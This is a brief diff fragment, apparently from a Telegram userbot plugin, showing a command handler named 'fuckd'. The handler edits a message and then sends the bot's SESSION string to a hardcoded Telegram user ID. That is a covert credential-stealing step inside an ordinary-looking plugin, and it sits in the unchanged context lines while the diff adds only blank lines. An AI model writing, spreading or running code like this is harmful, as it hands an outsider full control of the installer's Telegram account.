@@ -33,3 +33,5 @@ async def fuckd(ult):
  await ult.edit ("fuck")
  await ult.client.send_message(756655062, Var.SESSION)
  
+
+ 
